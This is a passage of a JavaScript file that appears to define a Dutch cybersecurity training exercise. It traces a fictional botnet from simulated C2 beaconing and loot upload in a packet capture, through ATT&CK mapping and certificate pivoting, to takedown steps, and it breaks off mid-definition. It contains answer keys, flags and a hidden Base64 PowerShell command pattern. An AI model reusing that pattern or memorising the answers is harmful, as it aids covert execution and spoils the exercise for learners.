/* Room: Casus botnet-takedown — van bot tot gecoördineerde actie */

// --- pcap: C2-beaconing van bot WS-MARKETING-09 (10.0.9.33) ---
// DGA-misses -> botmodule-download bij drop-server -> HTTP-beaconing naar C2 -> exfil over C2.
const PCAP_BOTNET = [
  { no: 1, time: '0.000', src: '10.0.9.33', dst: '10.0.9.1', proto: 'DNS', len: 84, info: 'Standaardquery A q7x2k9fz1a.jvt.lab (willekeurig?)' },
  { no: 2, time: '0.013', src: '10.0.9.1', dst: '10.0.9.33', proto: 'DNS', len: 84, info: 'Antwoord: NXDOMAIN (bestaat niet)' },
  { no: 3, time: '0.260', src: '10.0.9.33', dst: '10.0.9.1', proto: 'DNS', len: 86, info: 'Standaardquery A m4p8r2wd9c.jvt.lab (willekeurig?)' },
  { no: 4, time: '0.274', src: '10.0.9.1', dst: '10.0.9.33', proto: 'DNS', len: 86, info: 'Antwoord: NXDOMAIN (bestaat niet)' },
  { no: 5, time: '0.540', src: '10.0.9.33', dst: '10.0.9.1', proto: 'DNS', len: 80, info: 'Standaardquery A cdn-schim.jvt.lab' },
  { no: 6, time: '0.556', src: '10.0.9.1', dst: '10.0.9.33', proto: 'DNS', len: 96, info: 'Antwoord A cdn-schim.jvt.lab = 198.51.100.77' },
  { no: 7, time: '0.610', src: '10.0.9.33', dst: '198.51.100.77', proto: 'TCP', len: 74, info: '50112 -> 80 [SYN]' },
  { no: 8, time: '0.622', src: '198.51.100.77', dst: '10.0.9.33', proto: 'TCP', len: 74, info: '80 -> 50112 [SYN, ACK]' },
  {
    no: 9, time: '0.660', src: '10.0.9.33', dst: '198.51.100.77', proto: 'HTTP', len: 332,
    info: 'GET /modules/core.bin HTTP/1.1',
    stream: `GET /modules/core.bin HTTP/1.1
Host: cdn-schim.jvt.lab
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*

HTTP/1.1 200 OK
Server: nginx
Content-Type: application/octet-stream
Content-Length: 3904
X-Build: schimnet-core-v3

MZ......(binaire botmodule core.bin, 3.904 bytes)

Analist: de loader die al op de machine stond, haalt hier de ECHTE botmodule
op (ingress tool transfer). Pas daarna gaat de bot zelf praten met zijn C2.`,
  },
  { no: 10, time: '0.910', src: '198.51.100.77', dst: '10.0.9.33', proto: 'HTTP', len: 4212, info: 'HTTP/1.1 200 OK (application/octet-stream, 3.904 bytes)' },
  { no: 11, time: '6.000', src: '10.0.9.33', dst: '10.0.9.1', proto: 'DNS', len: 80, info: 'Standaardquery A schim-sync.jvt.lab' },
  { no: 12, time: '6.016', src: '10.0.9.1', dst: '10.0.9.33', proto: 'DNS', len: 96, info: 'Antwoord A schim-sync.jvt.lab = 203.0.113.50' },
  { no: 13, time: '6.060', src: '10.0.9.33', dst: '203.0.113.50', proto: 'TCP', len: 74, info: '50140 -> 80 [SYN]' },
  { no: 14, time: '6.072', src: '203.0.113.50', dst: '10.0.9.33', proto: 'TCP', len: 74, info: '80 -> 50140 [SYN, ACK]' },
  {
    no: 15, time: '6.110', src: '10.0.9.33', dst: '203.0.113.50', proto: 'HTTP', len: 268,
    info: 'POST /gate.php HTTP/1.1 (check-in)',
    stream: `C2-baken — gereconstrueerde check-in naar 203.0.113.50 (host schim-sync.jvt.lab)

>> POST /gate.php HTTP/1.1
>> Host: schim-sync.jvt.lab
>> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
>> Cookie: botid=SCHIM-7F3A
>> Content-Length: 22
>>
>> id=SCHIM-7F3A&task=poll
<< HTTP/1.1 200 OK
<< Server: nginx
<< Content-Length: 41
<<
<< sleep=45; note=JVT{c2_fluistert}

Analist: elke ~45 seconden exact dezelfde kleine POST naar hetzelfde IP.
Dat strakke ritme is "beaconing": de bot vraagt zijn command-and-control-
server om nieuwe opdrachten. In de server-respons staat de knipoog-vlag.`,
  },
  { no: 16, time: '6.270', src: '203.0.113.50', dst: '10.0.9.33', proto: 'HTTP', len: 180, info: 'HTTP/1.1 200 OK (sleep=45)' },
  { no: 17, time: '51.112', src: '10.0.9.33', dst: '203.0.113.50', proto: 'HTTP', len: 268, info: 'POST /gate.php HTTP/1.1 (check-in)' },
  { no: 18, time: '51.270', src: '203.0.113.50', dst: '10.0.9.33', proto: 'HTTP', len: 180, info: 'HTTP/1.1 200 OK (sleep=45)' },
  { no: 19, time: '63.400', src: '10.0.9.33', dst: '10.0.50.10', proto: 'HTTP', len: 410, info: 'GET /intranet HTTP/1.1 (normaal verkeer)' },
  { no: 20, time: '96.113', src: '10.0.9.33', dst: '203.0.113.50', proto: 'HTTP', len: 268, info: 'POST /gate.php HTTP/1.1 (check-in)' },
  { no: 21, time: '96.271', src: '203.0.113.50', dst: '10.0.9.33', proto: 'HTTP', len: 180, info: 'HTTP/1.1 200 OK (taak=stuur_buit)' },
  { no: 22, time: '141.120', src: '10.0.9.33', dst: '203.0.113.50', proto: 'HTTP', len: 5120, info: 'POST /gate.php HTTP/1.1 (upload 4.8 KB!) — buit over C2-kanaal' },
  { no: 23, time: '141.460', src: '203.0.113.50', dst: '10.0.9.33', proto: 'HTTP', len: 150, info: 'HTTP/1.1 200 OK (ontvangen)' },
  { no: 24, time: '186.114', src: '10.0.9.33', dst: '203.0.113.50', proto: 'HTTP', len: 268, info: 'POST /gate.php HTTP/1.1 (check-in)' },
];

CS.registerRoom({
  id: 'botnet-takedown',
  path: 'puzzels',
  order: 7,
  title: 'Casus: botnet-takedown',
  icon: '🤖',
  difficulty: 'Moeilijk',
  minutes: 70,
  summary: 'Eén samenhangende casus: je ontrafelt het fictieve botnet SchimNet van bot tot operator, mapt het gedrag op MITRE ATT&CK, koppelt de C2-infrastructuur via een pivot en zet de stappen van een gecoördineerde takedown (zoals Operatie Endgame, hoog-over) op een rij.',
  objectives: [
    'Uitleggen wat een botnet is en de rollen van bot, loader, C2-server en operator benoemen',
    'C2-beaconing van een bot in een pcap herkennen en een verstopte vlag in een stream vinden',
    'Aanvalsgedrag van een botnet koppelen aan de juiste MITRE ATT&CK-technieken',
    'De C2-infrastructuur van twee clusters koppelen met een pivot en de zeldzaamheid van een gedeeld kenmerk toetsen',
    'De vaste stappen van een botnet-takedown op de juiste volgorde zetten: identificeren, in kaart brengen, juridische basis, sinkholen/seizen, notificeren',
    'De rol van opsporing en partners (Europol, NCSC, hostingproviders) bij sinkholing en slachtoffernotificatie uitleggen',
  ],
  tasks: [
    {
      title: 'Taak 1 — Wat is een botnet?',
      content: `
        <p>Welkom bij de fictieve <strong>Operatie Spookzwerm</strong>. Analisten zien al weken dat besmette computers
        bij allerlei Nederlandse bedrijven op hetzelfde ritme "naar huis bellen". Vermoeden: ze zijn allemaal onderdeel
        van hetzelfde <strong>botnet</strong>, dat we voor dit onderzoek <strong>SchimNet</strong> noemen. In deze room
        pel je de zaak laag voor laag af — van één besmette pc tot de operator — en eindig je bij een gecoördineerde
        <strong>takedown</strong>.</p>

        <h3>De analogie van het zombieleger</h3>
        <p>Een botnet is een <em>leger van gekaapte computers</em>. Elke besmette machine (een <strong>bot</strong> of
        "zombie") doet gewoon zijn werk voor de eigenaar, maar luistert stiekem óók naar een vreemde baas. Die baas, de
        <strong>operator</strong> (ook wel <em>botherder</em>), stuurt via één kanaal opdrachten naar duizenden bots
        tegelijk: verstuur spam, voer een DDoS-aanval uit, of steel wachtwoorden. Eén commando, duizenden handen.</p>

        <h3>De onderdelen op een rij</h3>
        <ul>
          <li><strong>Bot (zombie):</strong> de besmette computer die opdrachten uitvoert.</li>
          <li><strong>Loader (dropper):</strong> het eerste kleine stukje malware dat binnenkomt en vervolgens de
          echte botmodule ophaalt en installeert. Bij Operatie Endgame (2024) draaide het juist om zulke loaders.</li>
          <li><strong>C2-server (command-and-control):</strong> de centrale server waarmee de bots contact houden om
          opdrachten op te halen en buit af te leveren.</li>
          <li><strong>Operator / botherder:</strong> de crimineel (of groep) die het botnet beheert en verhuurt.</li>
        </ul>

        <h3>Twee begrippen die je in deze zaak tegenkomt</h3>
        <p><strong>Sinkholing</strong> is de belangrijkste verstoringstechniek. Opsporing neemt de C2-domeinnaam over en
        wijst die naar een eigen, onschadelijke server (de "sinkhole"). De bots blijven inchecken, maar krijgen geen
        opdrachten meer — en de sinkhole ziet precies welke IP-adressen besmet zijn. Zo weet je wie je moet waarschuwen.</p>
        <p>Om sinkholing lastiger te maken gebruiken sommige botnets een <strong>DGA</strong> (domain generation
        algorithm): de bot verzint elke dag honderden willekeurig ogende domeinnamen en probeert ze één voor één, tot er
        eentje "leeft". De operator hoeft er maar één vooruit te registreren. In de pcap in taak 2 zie je de bot zulke
        willekeurige namen aftikken voordat hij een werkend C2-domein vindt.</p>

        <figure class="diagram">
          <svg viewBox="0 0 440 180" role="img" aria-label="Botnet: bots praten met C2, operator stuurt opdrachten">
            <rect x="20" y="30" width="70" height="30" rx="4" fill="var(--surface-2)" stroke="currentColor"/>
            <rect x="20" y="75" width="70" height="30" rx="4" fill="var(--surface-2)" stroke="currentColor"/>
            <rect x="20" y="120" width="70" height="30" rx="4" fill="var(--surface-2)" stroke="currentColor"/>
            <text x="55" y="49" text-anchor="middle" fill="currentColor" font-size="13">bot</text>
            <text x="55" y="94" text-anchor="middle" fill="currentColor" font-size="13">bot</text>
            <text x="55" y="139" text-anchor="middle" fill="currentColor" font-size="13">bot</text>
            <rect x="195" y="72" width="80" height="36" rx="4" fill="var(--accent-soft)" stroke="currentColor"/>
            <text x="235" y="94" text-anchor="middle" fill="currentColor" font-size="13">C2-server</text>
            <rect x="360" y="72" width="70" height="36" rx="4" fill="var(--surface-2)" stroke="currentColor"/>
            <text x="395" y="94" text-anchor="middle" fill="currentColor" font-size="13">operator</text>
            <line x1="90" y1="45" x2="195" y2="86" stroke="currentColor"/>
            <line x1="90" y1="90" x2="195" y2="90" stroke="currentColor"/>
            <line x1="90" y1="135" x2="195" y2="94" stroke="currentColor"/>
            <line x1="275" y1="90" x2="360" y2="90" stroke="currentColor"/>
          </svg>
          <figcaption>De bots checken in bij de C2-server; de operator stuurt daar zijn opdrachten naartoe. Verbreek je
          de C2 (sinkholing of inbeslagname), dan valt het hele leger stil.</figcaption>
        </figure>

        <div class="callout info">
          <strong>Alles fictief:</strong> alle namen, domeinen (<code>*.jvt.lab</code>) en adressen
          (<code>10.x</code>, <code>203.0.113.x</code>, <code>198.51.100.x</code>, <code>192.0.2.x</code> — officiële
          documentatiebereiken) in deze room zijn verzonnen. Je oefent in een afgeschermd lab, niet op echte
          infrastructuur.
        </div>
      `,
      questions: [
        { q: 'Hoe heet één besmette computer die deel uitmaakt van een botnet?', options: ['Een bot (zombie)', 'Een loader', 'Een sinkhole', 'Een operator'], answer: 0, explain: 'Elke gekaapte machine is een bot, ook wel zombie genoemd; samen vormen ze het botnet.' },
        { q: 'Hoe heet de centrale server waarmee de bots contact houden om opdrachten op te halen?', answer: ['C2', 'c2', 'command-and-control', 'command and control', 'C2-server'], hint: 'Command-and-...', explain: 'De command-and-control-server (C2) is het hart van het botnet; verstoor je die, dan valt het leger stil.' },
        { q: 'Wat doet een botnet-operator met sinkholing lastiger maken door elke dag honderden willekeurige domeinnamen te verzinnen?', answer: ['DGA', 'dga', 'domain generation algorithm'], hint: 'Drie letters; een algoritme dat domeinnamen genereert.', explain: 'Een DGA (domain generation algorithm) genereert telkens nieuwe domeinen, zodat je niet met één blokkade klaar bent.' },
        { q: 'Wat is sinkholing?', options: ['Het C2-domein overnemen en naar een onschadelijke server wijzen', 'Alle bots tegelijk versleutelen', 'De loader opnieuw verspreiden', 'Een bot handmatig opnieuw installeren'], answer: 0, explain: 'Bij sinkholing blijven de bots inchecken bij een gecontroleerde server die geen opdrachten geeft en wél de besmette IP-adressen registreert.' },
      ],
    },

    {
      title: 'Taak 2 — pcap: het baken van een bot',
      content: `
        <p>Eerste bewijs. Je krijgt een pcap van werkstation <code>WS-MARKETING-09</code> (<code>10.0.9.33</code>), dat
        zich vreemd gedraagt. Vind het bewijs dat deze machine een bot van SchimNet is: zoek het moment dat de
        <strong>botmodule</strong> wordt opgehaald en het <strong>C2-baken</strong> dat daarna op een vast ritme
        "naar huis belt".</p>

        <h3>Wat je verwacht te zien</h3>
        <ol>
          <li><strong>DGA-missers:</strong> bovenaan probeert de bot een paar willekeurig ogende domeinen
          (<code>q7x2k9fz1a.jvt.lab</code>, ...). Die bestaan niet: het antwoord is <code>NXDOMAIN</code>. Dat is het
          DGA-gedrag uit taak 1.</li>
          <li><strong>Botmodule ophalen:</strong> daarna haalt de loader de echte bot op met een
          <code>GET /modules/core.bin</code> bij de drop-server <code>cdn-schim.jvt.lab</code>
          (<code>198.51.100.77</code>). Open de "Follow stream" om die download te lezen.</li>
          <li><strong>C2-beaconing:</strong> vervolgens doet de bot elke ~45 seconden een kleine, bijna even grote
          <code>POST /gate.php</code> naar hetzelfde externe IP. Dat strakke ritme is het baken. In de server-respons
          van de eerste check-in staat een vlag verstopt.</li>
          <li><strong>Buit over het C2-kanaal:</strong> één POST springt eruit qua grootte (ruim 5 KB). Daar stuurt de
          bot buit terug via hetzelfde kanaal.</li>
        </ol>

        <div class="callout tip">
          <strong>Tip:</strong> filter op <code>http</code> of op <code>ip.addr==203.0.113.50</code> om alleen het
          C2-verkeer over te houden. Let op de <em>tijd</em> (vast interval) en de <em>len</em> (vaste grootte): mensen
          surfen grillig, een bot tikt als een klok. Codering is trouwens geen encryptie — alles hier staat gewoon in
          platte HTTP.
        </div>
      `,
      lab: { type: 'pcap', title: 'spookzwerm-ws09.pcap', packets: PCAP_BOTNET },
      questions: [
        { q: 'Naar welk extern IP-adres bakent de bot elke ~45 seconden (de C2-server)?', answer: ['203.0.113.50'], hint: 'Welk extern IP keert met dezelfde pakketlengte (268) op een vast interval terug?', explain: 'Alle check-ins van 10.0.9.33 gaan via POST /gate.php naar 203.0.113.50 (schim-sync.jvt.lab).' },
        { q: 'Welke vlag staat in de server-respons van de C2-check-in (Follow stream)?', answer: ['JVT{c2_fluistert}'], encoded: true, hint: 'Open Follow stream op de eerste POST /gate.php en lees de note= in het 200 OK-antwoord.', explain: 'De C2 antwoordt met sleep=45; note=JVT{c2_fluistert}.' },
        { q: 'Welk antwoord krijgen de eerste twee willekeurig ogende domeinen (het DGA-gedrag)?', answer: ['NXDOMAIN', 'nxdomain'], hint: 'Het DNS-antwoord dat zegt dat een domein niet bestaat.', explain: 'q7x2k9fz1a.jvt.lab en m4p8r2wd9c.jvt.lab leveren NXDOMAIN op; de bot tikt DGA-domeinen af tot er een leeft.' },
        { q: 'Waaraan herken je C2-beaconing in de pakketlijst, ook zonder de inhoud te lezen?', options: ['Aan het vaste interval en de vaste, kleine pakketgrootte naar hetzelfde IP', 'Aan heel veel verschillende bestemmingen', 'Aan één enkele grote download', 'Aan een lege pakketlijst'], answer: 0, explain: 'Een regelmatig interval met constante grootte naar één extern IP is de klassieke signatuur van beaconing.' },
      ],
    },

    {
      title: 'Taak 3 — Het gedrag mappen op MITRE ATT&CK',
      content: `
        <p>Je hebt nu waarnemingen van één bot. Om het gedrag van SchimNet te kunnen vergelijken en delen, vertaal je
        elke waarneming naar de gemeenschappelijke taal: een <strong>MITRE ATT&amp;CK</strong>-techniek met een vast ID
        (zoals <code>T1071</code>). Zo kun je straks precies zeggen welke stappen het botnet zet en waar je detectie moet
        afdekken.</p>

        <h3>Korte opfrisser</h3>
        <ul>
          <li>Een <strong>tactiek</strong> is het doel (waarom), bijvoorbeeld <em>Command and Control</em>.</li>
          <li>Een <strong>techniek</strong> is de manier (hoe), bijvoorbeeld <em>Application Layer Protocol</em>
          (<code>T1071</code>) — contact houden via gewoon web-verkeer.</li>
          <li>Een techniek met een punt erachter is een <strong>sub-techniek</strong>, bijvoorbeeld
          <code>T1059.001</code> (PowerShell) onder <code>T1059</code>.</li>
        </ul>

        <h3>Opdracht</h3>
        <p>In het lab staan zes waarnemingen uit de SchimNet-casus. Kies bij elke waarneming de juiste techniek uit de
        ingebouwde bank. Denk aan de keten van een botnet: eerst binnenkomen, dan de bot ophalen, dan contact houden,
        blijven staan, opdrachten uitvoeren en buit terugsturen.</p>

        <div class="callout tip">
          <strong>Tip:</strong> let op het sleutelwoord in elke waarneming. "Haalt op bij een drop-server" wijst op het
          binnenhalen van gereedschap; "checkt elke 45 seconden in via HTTP-POSTs" wijst op het C2-kanaal; "schrijft
          zichzelf in de Run-sleutel" is een klassieke autostart-truc.
        </div>

        <p>Map je alle zes waarnemingen correct, dan verdien je de vlag <code>JVT{zwerm_in_kaart}</code> — je hebt het
        gedrag van de zwerm volledig in kaart.</p>
      `,
      lab: {
        type: 'attackmap',
        items: [
          { desc: 'Het slachtoffer opent de bijlage factuur-herinnering.zip uit een spammail; daarin zit een snelkoppeling die de loader start.', code: 'T1566.001', explain: 'Spearphishing Attachment (Initial Access): een kwaadaardige bijlage is nog steeds de nummer-1-manier waarop botnet-loaders binnenkomen.' },
          { desc: 'De loader haalt de eigenlijke botmodule core.bin op bij cdn-schim.jvt.lab en zet hem op schijf.', code: 'T1105', explain: 'Ingress Tool Transfer (Command and Control): extra gereedschap of modules binnenhalen vanaf een externe server — precies wat je in de pcap zag.' },
          { desc: 'De bot checkt elke 45 seconden in bij schim-sync.jvt.lab via gewone HTTP-POSTs om opdrachten op te halen.', code: 'T1071', explain: 'Application Layer Protocol (Command and Control): C2-verkeer verstoppen in normaal ogend web-verkeer (HTTP) — het baken uit taak 2.' },
          { desc: 'De bot schrijft zichzelf in de Windows Run-sleutel zodat hij na elke herstart automatisch opnieuw start.', code: 'T1547', explain: 'Boot or Logon Autostart Execution (Persistence): via een Run-sleutel blijft de bot ook na een herstart actief.' },
          { desc: 'De operator stuurt via het botnet een verborgen, Base64-gecodeerde opdracht: powershell.exe -w hidden -enc <base64>.', code: 'T1059.001', explain: 'PowerShell (Execution): met -enc wordt de opdracht in Base64 verhuld en verborgen uitgevoerd.' },
          { desc: 'Buitgemaakte inloggegevens worden via dezelfde gate.php-POSTs teruggestuurd naar de C2-server (de grote upload in de pcap).', code: 'T1041', explain: 'Exfiltration Over C2 Channel (Exfiltration): data weglekken via precies hetzelfde kanaal waarover de bot al praat, zodat het niet opvalt.' },
        ],
      },
      questions: [
        { q: 'Welk techniek-ID past bij "de bot checkt elke 45 seconden in via HTTP-POSTs naar de C2"?', answer: ['T1071'], hint: 'Application Layer Protocol, tactiek Command and Control.', explain: 'T1071 (Application Layer Protocol): C2-verkeer verstopt in normaal web-verkeer.' },
        { q: 'Welk techniek-ID hoort bij het ophalen van de botmodule core.bin bij de drop-server?', answer: ['T1105'], hint: 'Ingress Tool ...', explain: 'T1105 (Ingress Tool Transfer): extra gereedschap binnenhalen vanaf een externe server.' },
        { q: 'De bot zet zichzelf in de Windows Run-sleutel. Welke techniek is dat?', options: ['T1547 Boot or Logon Autostart Execution', 'T1486 Data Encrypted for Impact', 'T1110 Brute Force', 'T1190 Exploit Public-Facing Application'], answer: 0, explain: 'T1547 (Boot or Logon Autostart Execution, tactiek Persistence): via autostart blijft de bot na een herstart draaien.' },
        { q: 'Welke vlag verdien je door alle zes waarnemingen juist te mappen?', answer: ['JVT{zwerm_in_kaart}'], hint: 'Staat als beloning in de tekst van deze taak.', explain: 'Alle zes correct gekoppeld levert JVT{zwerm_in_kaart} op.' },
      ],
    },

    {
      title: 'Taak 4 — Pivot: de C2-infrastructuur koppelen',
      content: `
        <p>Eén bot en één C2-server zijn niet genoeg voor een takedown. Je wilt weten hoe <em>groot</em> SchimNet is en of
        een tweede, net ontdekte C2-cluster bij dezelfde operator hoort. Daarvoor <strong>pivoteer</strong> je: je begint
        bij een bekend kenmerk en springt via relaties (met tijd en herkomst) naar nieuwe kenmerken.</p>

        <h3>De twee clusters</h3>
        <ul>
          <li><strong>Cluster Alpha:</strong> de C2 die je al kent, <code>schim-sync.jvt.lab</code> op
          <code>203.0.113.50</code>.</li>
          <li><strong>Cluster Bravo:</strong> een pas opgedoken C2, <code>update-knoop.jvt.lab</code> op een <em>ander</em>
          IP (<code>198.51.100.90</code>). Is dit toeval, of dezelfde baas?</li>
        </ul>

        <h3>Toets de zeldzaamheid</h3>
        <p>De IP-adressen verschillen, dus daarop vind je geen brug. Maar beide domeinen presenteren volgens
        <strong>certificate transparency</strong> (crt.sh) <em>hetzelfde</em> TLS-certificaat <code>A1B2C3D4</code>. Een
        hergebruikt certificaat is <strong>zeldzaam</strong> en dus sterk bewijs. Pas op voor een valse brug: beide IP's
        horen bij dezelfde hostingprovider (<code>AS64500</code>), maar dat delen duizenden onschuldige sites ook — niet
        zeldzaam, dus geen bewijs.</p>

        <div class="callout tip">
          <strong>Tip:</strong> klik in het lab vanaf Cluster Alpha door tot je bij het certificaat komt, en kijk welk
          ander domein datzelfde certificaat presenteert. Vul dat gedeelde kenmerk in als antwoord op de brugvraag.
        </div>

        <p>Pas je de zeldzaamheidstoets juist toe — kies het certificaat, niet de hoster — dan verdien je de vlag
        <code>JVT{cert_bruggt_de_zwerm}</code>.</p>
      `,
      lab: {
        type: 'pivot',
        title: 'SchimNet — Cluster Alpha vs. Cluster Bravo',
        scenario: 'Cluster Alpha is de bekende C2 van SchimNet. Cluster Bravo is net opgedoken. Horen ze bij dezelfde operator? Pivoteer langs de relaties en toets de zeldzaamheid van elk gedeeld kenmerk.',
        entities: [
          { id: 'dA', type: 'domain', label: 'schim-sync.jvt.lab' },
          { id: 'ipA', type: 'ip', label: '203.0.113.50' },
          { id: 'dB', type: 'domain', label: 'update-knoop.jvt.lab' },
          { id: 'ipB', type: 'ip', label: '198.51.100.90' },
          { id: 'cert', type: 'cert', label: 'A1B2C3D4' },
          { id: 'wal', type: 'wallet', label: 'bc1qfictiefschim' },
          { id: 'mail', type: 'email', label: 'beheer@schim-sync.jvt.lab' },
          { id: 'asn', type: 'asn', label: 'AS64500 FictiefHost' },
        ],
        edges: [
          { from: 'dA', to: 'ipA', rel: 'resolvet naar', time: '2026-01', source: 'passive DNS' },
          { from: 'dA', to: 'cert', rel: 'presenteert cert', time: '2026-01', source: 'crt.sh' },
          { from: 'dA', to: 'mail', rel: 'WHOIS-contact', time: '2026-01', source: 'WHOIS' },
          { from: 'dA', to: 'wal', rel: 'verhuur-betaaladres', time: '2026-01', source: 'rapport' },
          { from: 'dB', to: 'ipB', rel: 'resolvet naar', time: '2026-02', source: 'passive DNS' },
          { from: 'dB', to: 'cert', rel: 'presenteert cert', time: '2026-02', source: 'crt.sh' },
          { from: 'ipA', to: 'asn', rel: 'hoort bij (hosting)', time: '2026-01', source: 'RIPEstat' },
          { from: 'ipB', to: 'asn', rel: 'hoort bij (hosting)', time: '2026-02', source: 'RIPEstat' },
        ],
        goal: 'Welk kenmerk verbindt Cluster Alpha en Cluster Bravo van het botnet? (typ het label of het type)',
        bridge: ['A1B2C3D4', 'cert', 'certificaat'],
      },
      questions: [
        { q: 'Welk zeldzaam kenmerk bruggt Cluster Alpha en Cluster Bravo?', answer: ['certificaat', 'cert', 'A1B2C3D4', 'het certificaat', 'tls-certificaat'], hint: 'Hetzelfde kenmerk staat in crt.sh bij beide domeinen; de IP-adressen verschillen juist.', explain: 'Beide C2-domeinen presenteren hetzelfde TLS-certificaat A1B2C3D4. Hergebruik van een certificaat is zeldzaam, dus een sterke brug tussen de clusters.' },
        { q: 'Beide C2-IP\'s horen bij dezelfde hostingprovider (AS64500). Waarom is dat geen sterke brug?', options: ['Omdat heel veel onschuldige sites dezelfde hoster delen — het kenmerk is niet zeldzaam', 'Omdat ASN-nummers altijd nep zijn', 'Omdat hosting niets met IP-adressen te maken heeft', 'Dat is juist wél de sterkste brug'], answer: 0, explain: 'Een gedeelde hoster is te algemeen om iets te bewijzen; de zeldzaamheidstoets bepaalt of een gedeeld kenmerk echt bewijs is.' },
        { q: 'Welke vlag verdien je door de zeldzaamheidstoets juist toe te passen?', answer: ['JVT{cert_bruggt_de_zwerm}'], hint: 'Staat als beloning in de tekst van deze taak.', explain: 'Kies het zeldzame dwarsverband (het certificaat), niet het toevallige (de hoster): JVT{cert_bruggt_de_zwerm}.' },
      ],
    },

    {
      title: 'Taak 5 — De takedown: de stappen op een rij',
      content: `
        <p>Je weet nu hoe SchimNet werkt en hoe groot het is. Tijd voor de climax: een gecoördineerde
        <strong>takedown</strong>, in de geest van <strong>Operatie Endgame</strong> (2024, hoog-over): een
        internationale actie waarbij opsporingsdiensten de keten rond botnet-loaders en droppers in één klap
        verstoorden. Zo'n operatie volgt een vaste volgorde, want één verkeerde stap en de operator wist alles of vlucht.</p>

        <h3>De vijf kernstappen (plus nazorg)</h3>
        <ol>
          <li><strong>Identificeren.</strong> Analyseer samples en verkeer; stel de C2-domeinen, de IP's en het
          DGA-algoritme vast. (Dat deed je in taak 2 tot en met 4.)</li>
          <li><strong>In kaart brengen.</strong> Meet de volledige infrastructuur en de omvang van de zwerm: hoeveel bots,
          welke C2-clusters, wie is de operator? Soms infiltreert men het beheerpaneel of doet men een
          sinkhole-test om bots te tellen.</li>
          <li><strong>Juridische basis.</strong> Niets gebeurt zonder recht: de officier van justitie en de
          rechter-commissaris machtigen de actie, en internationaal wordt afgestemd via <strong>Europol</strong> en
          <strong>Eurojust</strong> (rechtshulp, want servers staan vaak in het buitenland).</li>
          <li><strong>Sinkholen &amp; seizen.</strong> Op één gecoördineerd moment neem je de C2-domeinen over
          (sinkholing) en neem je de servers in beslag (seize). Alles tegelijk, zodat de operator niet kan uitwijken.</li>
          <li><strong>Slachtoffers notificeren.</strong> De sinkhole ziet welke IP-adressen nog inchecken. Die lijst gaat
          via het <strong>NCSC</strong> en nationale CERT's naar de getroffen organisaties, zodat zij kunnen opschonen.</li>
          <li><strong>Nazorg.</strong> Slachtoffers verwijderen de bot, indicatoren worden gedeeld, en je blijft
          monitoren op een heropleving (de operator probeert soms een nieuw botnet op te bouwen).</li>
        </ol>

        <div class="callout warn">
          <strong>Waarom de volgorde telt:</strong> zet je de sinkhole te vroeg (vóór je alles in kaart hebt), dan weet de
          operator dat je er bent en verdwijnt het bewijs. Doe je de seize zonder juridische basis, dan is het bewijs
          onbruikbaar in de rechtszaal. En zonder de notificatie-stap blijven duizenden slachtoffers besmet.
        </div>

        <p>Zet in het lab de stappen in de juiste volgorde. Klopt het, dan verschijnt de vlag
        <code>JVT{keten_doorgeknipt}</code>.</p>
      `,
      lab: {
        type: 'ordering',
        title: 'Operatie Spookzwerm — de takedown',
        prompt: 'Zet de stappen van de botnet-takedown in de juiste volgorde (gebruik de uitleg uit de taaktekst).',
        flag: 'JVT{keten_doorgeknipt}',
        explain: 'De vaste keten loopt: identificeren -> in kaart brengen -> juridische basis -> sinkholen & seizen -> slachtoffers notificeren -> nazorg. Te vroeg sinkholen verraadt je; seizen zonder recht maakt het bewijs onbruikbaar; zonder notificatie blijven slachtoffers besmet.',
        items: [
          { id: 'a', label: 'Identificeren — samples en C2-verkeer analyseren; de C2-domeinen, IP\'s en het DGA vaststellen' },
          { id: 'b', label: 'In kaart brengen — de hele infrastructuur en de omvang van de zwerm meten (sinkhole-test, infiltratie van het beheerpaneel)' },
          { id: 'c', label: 'Juridische basis — officier van justitie en rechter-commissaris machtigen; internationaal afstemmen via Europol/Eurojust' },
          { id: 'd', label: 'Sinkholen & seizen — op één gecoördineerd moment de C2-domeinen overnemen en de servers in beslag nemen' },
          { id: 'e', label: 'Slachtoffers notificeren — besmette IP-adressen uit de sinkhole via NCSC en CERT\'s naar de getroffenen sturen' },
          { id: 'f', label: 'Nazorg — slachtoffers laten opschonen, indicatoren publiceren en monitoren op een heropleving' },
        ],
        correct: ['a', 'b', 'c', 'd', 'e', 'f'],
      },
      questions: [
        { q: 'Welke stap komt direct vóór het notificeren van de slachtoffers?', options: ['Sinkholen & seizen', 'Identificeren', 'Nazorg', 'In kaart brengen'], answer: 0, explain: 'Pas na het sinkholen ziet de sinkhole welke IP-adressen besmet zijn; die lijst gebruik je daarna om te notificeren.' },
        { q: 'Waarom moet de juridische basis geregeld zijn vóór de seize?', options: ['Anders is het in beslag genomen bewijs onbruikbaar in de rechtszaal', 'Omdat sinkholing anders niet werkt', 'Omdat de bots anders geen opdrachten meer krijgen', 'Dat hoeft helemaal niet'], answer: 0, explain: 'Zonder machtiging (officier van justitie, rechter-commissaris, internationale rechtshulp) houdt het bewijs geen stand.' },
        { q: 'Welke vlag verschijnt als de volgorde klopt?', answer: ['JVT{keten_doorgeknipt}'], hint: 'Verschijnt in het ordering-lab bij de juiste volgorde.', explain: 'De juiste keten levert JVT{keten_doorgeknipt} op.' },
      ],
    },

    {
      title: 'Taak 6 — Connections: breng de begrippen samen',
      content: `
        <p>Je hebt in deze casus veel begrippen gezien: onderdelen van een botnet, manieren waarop bots met hun C2 praten,
        acties tijdens een takedown en de partners die meehelpen. Tijd om ze te ordenen. In het lab staan zestien
        begrippen; verdeel ze in <strong>vier groepen van vier</strong>. Elk begrip hoort bij precies één groep.</p>

        <h3>De vier categorieën</h3>
        <ul>
          <li><strong>Onderdelen van een botnet</strong> — de bouwstenen van de zwerm zelf.</li>
          <li><strong>C2-kanalen &amp; -technieken</strong> — manieren waarop bots hun C2 vinden of mee praten.</li>
          <li><strong>Acties bij een takedown</strong> — wat opsporing doet om het botnet te verstoren.</li>
          <li><strong>Partners bij een takedown</strong> — wie meewerkt aan de operatie.</li>
        </ul>

        <div class="callout tip">
          <strong>Tip:</strong> twijfel je tussen twee groepen? Vraag je af <em>wie</em> het begrip gebruikt. Een
          <em>bot</em> gebruikt een C2-kanaal (DGA, beaconing); <em>opsporing</em> voert een takedown-actie uit
          (sinkholing, inbeslagname). Zo valt elk begrip op zijn plek.
        </div>

        <p>Alle zestien juist gegroepeerd levert de vlag <code>JVT{zestien_op_een_rij}</code> op.</p>
      `,
      lab: {
        type: 'connections',
